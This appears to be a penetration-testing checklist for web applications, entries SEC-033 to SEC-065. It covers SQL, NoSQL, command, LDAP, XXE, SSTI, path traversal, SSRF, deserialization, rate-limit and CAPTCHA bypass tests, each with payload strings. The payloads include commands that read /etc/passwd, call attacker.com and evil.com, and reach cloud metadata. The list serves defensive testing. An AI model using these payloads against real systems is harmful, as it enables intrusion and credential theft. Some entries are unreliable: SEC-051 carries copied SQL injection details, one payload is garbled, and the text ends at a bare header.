## SEC-033 — Blind SQL Injection Detection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Test for boolean-based blind SQL injection using true/false conditions. 2. Test for time-based blind injection using SLEEP or WAITFOR. 3. Compare response differences for true and false conditions. 4. Test with conditional errors.

**Expected Result:** Application must prevent all forms of SQL injection including blind variants through consistent use of parameterized queries.

**Payload Example:**

```
id=1 AND 1=1 vs id=1 AND 1=2 (compare responses);id=1 AND SLEEP(5)--;id=1 AND IF(1=1,SLEEP(5),0)--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-034 — Second-Order SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Register a user with SQL payload in the username or profile fields. 2. Trigger application functionality that reads and uses the stored data in a query. 3. Check for SQL execution when stored data is used. 4. Monitor for delayed SQL errors.

**Expected Result:** Application must use parameterized queries even when using data retrieved from the database in subsequent queries.

**Payload Example:**

```
Register with username=admin'--;update profile with bio=' OR 1=1--;store payload that executes when admin views data
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-035 — SQL Injection via HTTP Headers
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Test SQL injection in User-Agent header. 2. Test in Referer header. 3. Test in X-Forwarded-For header. 4. Test in Cookie values. 5. Test in Accept-Language header. 6. Check if any headers are logged to database.

**Expected Result:** Application must sanitize and use parameterized queries for any HTTP header values that are stored or used in database queries.

**Payload Example:**

```
User-Agent: ' OR 1=1--;Referer: ' UNION SELECT password FROM users--;X-Forwarded-For: 127.0.0.1' OR '1'='1;Cookie: session=' OR 1=1--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-036 — NoSQL Injection Testing
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. If NoSQL database is used inject NoSQL operators in parameters. 2. Test MongoDB query operators like $gt and $ne and $regex. 3. Test JavaScript injection in $where clauses. 4. Test for authentication bypass.

**Expected Result:** Application must sanitize inputs for NoSQL injection patterns and use parameterized queries or ORM methods.

**Payload Example:**

```
{"username":{"$ne":""},password:{"$ne":""}};{"$where":"sleep(5000)"};{"user":{"$gt":""}};{"$regex":".*"}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap;Burp Suite;Custom Scripts

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## SEC-037 — SQL Injection in ORDER BY and GROUP BY
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Identify sort and order parameters in queries. 2. Inject SQL in sort_by or order parameters. 3. Test with numeric ORDER BY for column enumeration. 4. Test for error-based injection via ORDER BY.

**Expected Result:** Application must whitelist allowed column names for sorting and ordering and never use user input directly in ORDER BY clauses.

**Payload Example:**

```
sort=name;(SELECT SLEEP(5));order_by=1,2,3,(SELECT password FROM users);sort=IF(1=1,name,email)
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-038 — SQL Injection via JSON Body
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. Identify JSON API endpoints. 2. Inject SQL payloads in JSON string values. 3. Test with JSON arrays and nested objects. 4. Check for type confusion between string and integer. 5. Test with Unicode-encoded SQL.

**Expected Result:** Application must use parameterized queries for all data from JSON request bodies regardless of the data type.

**Payload Example:**

```
{"id":"1 OR 1=1",name:"' UNION SELECT password FROM users--"};{"filter":{"$where":"this.password.match(/.*/)"}}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-039 — WAF Bypass for SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** SQL Injection Prevention

**Test Steps:** 1. If WAF is present test WAF bypass techniques. 2. Use comments like /*!UNION*/ and /**/ inline. 3. Test case variation like SeLeCt and UnIoN. 4. Use URL encoding and double encoding. 5. Test with alternative syntax.

**Expected Result:** Application must implement defense in depth with both WAF and parameterized queries so that even if WAF is bypassed the application is still protected.

**Payload Example:**

```
/*!50000UNION*/ /*!50000SELECT*/;uNiOn SeLeCt;%55%4e%49%4f%4e;UN/**/ION SEL/**/ECT;' or '1'='1' /*;1' /*!50000%55nIoN*/ /*!50000%53telephones*/
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite;WAF bypass wordlists

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-040 — Null Byte Injection Testing
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Inject null bytes in input fields at various positions. 2. Test file upload with null bytes in filename. 3. Check if null bytes truncate input before validation. 4. Test in URL paths and parameters.

**Expected Result:** Application must reject null bytes in all user input and validate the complete input string without truncation.

**Payload Example:**

```
filename=test.php%00.jpg;param=valid_input%00<script>alert(1)</script>;path=/allowed/../%00/restricted
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SEC-041 — Unicode and Encoding Bypass Testing
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Test with various Unicode representations of dangerous characters. 2. Test with overlong UTF-8 sequences. 3. Test with fullwidth characters. 4. Test with Unicode normalization bypass. 5. Test with homoglyph attacks.

**Expected Result:** Application must normalize Unicode input before validation and reject overlong or malformed encoding sequences.

**Payload Example:**

```
Use fullwidth ＜script＞ instead of <script>;overlong UTF-8 %c0%af for /;homoglyphs like Ρaypal (Cyrillic Р)
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SEC-042 — Command Injection Testing
**Test Category:** Injection (WSTG-INPV-12) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify fields that may interact with system commands. 2. Inject command separators like semicolon and pipe and ampersand. 3. Test with backticks and $() command substitution. 4. Test ping and nslookup for out-of-band detection.

**Expected Result:** Application must never pass user input directly to system commands and must use safe APIs or strict input whitelisting.

**Payload Example:**

```
;cat /etc/passwd;|id;`whoami`;$(id);&& cat /etc/passwd;|| id;%0aid;\nid;input`nslookup attacker.com`
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite;Commix;Collaborator

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## SEC-043 — LDAP Injection Testing
**Test Category:** Injection (WSTG-INPV-06) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify fields that may query LDAP directories. 2. Inject LDAP filter special characters. 3. Test authentication bypass via LDAP injection. 4. Test for information disclosure through modified queries.

**Expected Result:** Application must sanitize LDAP special characters and use parameterized LDAP queries.

**Payload Example:**

```
username=*;password=*;search=*)(objectClass=*;admin)(|(password=*;input=*)(uid=*))(|(uid=*
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## SEC-044 — XML Injection and XXE Testing
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify XML input processing points. 2. Test for XXE with file retrieval payload. 3. Test for blind XXE via out-of-band. 4. Test for XML entity expansion (billion laughs). 5. Test for XInclude injection.

**Expected Result:** Application must disable external entity processing in all XML parsers and validate XML input against schemas.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>;<!ENTITY % xxe SYSTEM 'http://evil.com/xxe.dtd'>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP;XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## SEC-045 — Server-Side Template Injection (SSTI)
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify fields where input is rendered through templates. 2. Inject template expressions for common engines. 3. Test Jinja2 and Twig and Freemarker and Velocity and Mako. 4. Attempt code execution through template injection.

**Expected Result:** Application must not process user input as template code and must escape all template syntax in user data.

**Payload Example:**

```
{{7*7}};${7*7};#{7*7};<%= 7*7 %>;{{config}};{{''.__class__.__mro__[1].__subclasses__()}};${T(java.lang.Runtime).getRuntime().exec('id')}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap;SSTImap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## SEC-046 — Path Traversal Testing
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify file inclusion or file access parameters. 2. Test with ../ and ..\ traversal sequences. 3. Test with URL-encoded traversal. 4. Test with double encoding. 5. Test absolute paths. 6. Test null byte termination.

**Expected Result:** Application must validate file paths against a whitelist and canonicalize paths before access to prevent directory traversal.

**Payload Example:**

```
../../../etc/passwd;....//....//etc/passwd;%2e%2e%2f%2e%2e%2f;..%252f..%252f;/etc/passwd%00.jpg;..%c0%af
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;DotDotPwn;ffuf

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## SEC-047 — HTTP Parameter Pollution Testing
**Test Category:** Input Validation (WSTG-INPV-04) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Send requests with duplicate parameters. 2. Test with same parameter in both GET and POST. 3. Check which value the application uses. 4. Test for parameter priority conflicts.

**Expected Result:** Application must handle duplicate parameters consistently and reject ambiguous requests to prevent parameter pollution attacks.

**Payload Example:**

```
GET /api/action?admin=false&admin=true;POST body user_id=1001&user_id=1002;mix GET and POST with conflicting values
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## SEC-048 — CRLF Injection Testing
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Inject CRLF characters in input fields. 2. Test for HTTP response splitting. 3. Test for log injection. 4. Check URL redirect parameters for CRLF. 5. Test email fields for header injection.

**Expected Result:** Application must strip or encode CRLF characters from all user input to prevent response splitting and log injection.

**Payload Example:**

```
input=%0d%0aSet-Cookie:evil=true;url=test%0d%0aHTTP/1.1 200 OK%0d%0a;header=value%0d%0aInjected-Header:evil
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;CRLFuzz

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## SEC-049 — Server-Side Request Forgery (SSRF) Testing
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify parameters that accept URLs. 2. Test with internal IP addresses. 3. Test with localhost variants. 4. Test with cloud metadata URLs. 5. Test with DNS rebinding. 6. Test with URL scheme variations.

**Expected Result:** Application must validate all user-provided URLs against an allowlist and block internal network and metadata service access.

**Payload Example:**

```
url=http://169.254.169.254/latest/meta-data/;url=http://localhost:8080;url=http://127.0.0.1;url=http://[::1];url=http://0x7f000001
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator;SSRFMap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## SEC-050 — Deserialization Vulnerability Testing
**Test Category:** Injection (WSTG-INPV-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify serialized data in requests cookies or parameters. 2. Detect serialization format (Java/PHP/.NET/Python). 3. Inject malicious serialized objects. 4. Test for remote code execution via deserialization.

**Expected Result:** Application must avoid deserializing untrusted data and implement type checking and integrity verification on serialized objects.

**Payload Example:**

```
Java serialized object with ysoserial payload;PHP O:8:"autoload":0:{};Python pickle payload;.NET ObjectStateFormatter
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** Burp Suite;ysoserial;PHPGGC;Custom Scripts

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## SEC-051 — Expression Language Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Input Sanitization

**Test Steps:** 1. Identify Java EE or Spring applications. 2. Test for Expression Language injection in parameters. 3. Inject EL expressions like ${} and #{}. 4. Test for OGNL injection in Struts applications.

**Expected Result:** Application must not evaluate user input as expression language and must escape EL syntax in all user data.

**Payload Example:**

```
${7*7};${applicationScope};#{7*7};%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SEC-052 — Login Rate Limiting Verification
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Attempt multiple failed login attempts in rapid succession. 2. Count how many attempts are allowed before lockout or throttling. 3. Check if rate limiting applies per-user per-IP or both. 4. Test with varying credentials.

**Expected Result:** Application must implement rate limiting on login attempts allowing no more than 5-10 failed attempts before temporary lockout with increasing delays.

**Payload Example:**

```
Send 50+ POST /api/login with wrong passwords;check at what count rate limiting triggers;verify lockout duration
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Hydra;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-053 — Rate Limit Bypass via Header Manipulation
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Trigger rate limiting. 2. Try bypassing with X-Forwarded-For header changes. 3. Test with X-Real-IP and X-Originating-IP and X-Client-IP headers. 4. Test with True-Client-IP header. 5. Rotate IP values.

**Expected Result:** Application must determine the client's true IP address from the actual network connection and not trust client-provided IP headers for rate limiting.

**Payload Example:**

```
X-Forwarded-For: 1.2.3.{1-255};X-Real-IP: 10.0.0.{1-255};X-Originating-IP: 192.168.1.{1-255};True-Client-IP: random_IPs
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-054 — Rate Limit Bypass via Parameter Variation
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Trigger rate limiting on an endpoint. 2. Add extra parameters to the request. 3. Change parameter order. 4. Add whitespace or encoding variations. 5. Check if parameter changes reset the rate counter.

**Expected Result:** Application must implement rate limiting based on the core request identity and not be bypassed by parameter variations.

**Payload Example:**

```
Add dummy=random to each request;change param order;URL-encode parameters differently;add trailing spaces
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-055 — API Rate Limiting Assessment
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Send rapid requests to API endpoints. 2. Measure rate limits on different endpoints. 3. Check for consistent rate limiting across all APIs. 4. Test with authenticated vs unauthenticated requests. 5. Check rate limit response headers.

**Expected Result:** Application must implement consistent rate limiting across all API endpoints with clear rate limit headers in responses.

**Payload Example:**

```
Send 100+ requests per second to various endpoints;check X-RateLimit-Limit;X-RateLimit-Remaining;Retry-After headers
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;JMeter;vegeta

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-056 — Rate Limiting on Password Reset
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Send multiple password reset requests for the same email. 2. Check how many resets are allowed per time period. 3. Test with different emails rapidly. 4. Check for email bombing prevention.

**Expected Result:** Application must rate limit password reset requests to prevent email bombing and brute force of reset tokens.

**Payload Example:**

```
Send 100+ POST /api/password-reset with same email;rotate emails at high frequency
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-057 — Rate Limiting on Registration
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Submit rapid account registration requests. 2. Check for rate limiting on the registration endpoint. 3. Test with automated registration tools. 4. Verify CAPTCHA enforcement after threshold.

**Expected Result:** Application must rate limit registration requests and implement CAPTCHA to prevent automated mass account creation.

**Payload Example:**

```
Send 50+ POST /api/register with different email patterns;check for CAPTCHA trigger and rate limiting
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-058 — Distributed Rate Limit Testing
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Send requests from multiple IP addresses simultaneously. 2. Check if per-user rate limiting works across IPs. 3. Test if total request volume is considered. 4. Verify distributed attack detection.

**Expected Result:** Application must implement per-account rate limiting that works across multiple source IPs and detect distributed attack patterns.

**Payload Example:**

```
Send requests from 10+ different IPs targeting same account;check if aggregate rate limiting applies
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Custom Scripts;Cloud Infrastructure;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-059 — Rate Limiting on Sensitive Operations
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Test rate limiting on fund transfers. 2. Test on payment operations. 3. Test on data export functions. 4. Test on API key generation. 5. Verify rate limits on admin operations.

**Expected Result:** Application must implement strict rate limiting on all sensitive operations with lower thresholds than general endpoints.

**Payload Example:**

```
Send rapid POST /api/transfer;POST /api/payments;GET /api/export;POST /api/keys/create requests
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-060 — Rate Limit Response Information Disclosure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Rate Limiting

**Test Steps:** 1. Trigger rate limiting. 2. Examine the rate limit response for information disclosure. 3. Check if remaining attempts or reset time reveals sensitive timing. 4. Verify error message content.

**Expected Result:** Rate limit responses must not reveal information that could help attackers optimize their attack such as exact remaining attempts or precise reset timestamps.

**Payload Example:**

```
Check 429 response for X-RateLimit-Remaining: 0;Retry-After: 30;check if response differs for valid vs invalid users
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-061 — CAPTCHA Bypass via Removal
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Identify forms protected by CAPTCHA. 2. Submit the form normally. 3. Remove the CAPTCHA parameter from the request entirely. 4. Remove the CAPTCHA token/response field. 5. Check if the form processes without CAPTCHA.

**Expected Result:** Application must require and validate CAPTCHA responses server-side and reject submissions where the CAPTCHA parameter is missing.

**Payload Example:**

```
Remove g-recaptcha-response parameter;remove captcha_token;remove h-captcha-response from POST body
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-062 — CAPTCHA Bypass via Empty Response
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Submit the form with an empty CAPTCHA response value. 2. Submit with captcha=null or captcha=undefined. 3. Submit with captcha=0 or captcha=false. 4. Check if empty values bypass validation.

**Expected Result:** Application must reject empty or null CAPTCHA responses and require a valid solved CAPTCHA token.

**Payload Example:**

```
g-recaptcha-response=;captcha_response=null;captcha=undefined;h-captcha-response=0;captcha=false
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-063 — CAPTCHA Token Reuse
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Solve a CAPTCHA and capture the valid response token. 2. Submit the form successfully. 3. Reuse the same CAPTCHA token for subsequent submissions. 4. Check if the old token is still accepted.

**Expected Result:** Application must invalidate CAPTCHA tokens after single use and reject reused tokens for subsequent submissions.

**Payload Example:**

```
Capture valid g-recaptcha-response token;replay in 10+ subsequent requests;check if each succeeds
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-064 — CAPTCHA Implementation Server-Side Validation
**Test Category:** Authentication (WSTG-ATHN-08) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Captcha / reCAPTCHA

**Test Steps:** 1. Solve CAPTCHA and submit the form. 2. Check if validation is done client-side only. 3. Intercept and modify the validation response. 4. Change validation result from fail to success.

**Expected Result:** Application must validate CAPTCHA responses server-side by calling the CAPTCHA provider's verification API and not rely on client-side validation.

**Payload Example:**

```
Intercept CAPTCHA validation response and change {"success":false} to {"success":true};bypass client-side JS validation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SEC-065 — CAPTCHA Secret Key Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

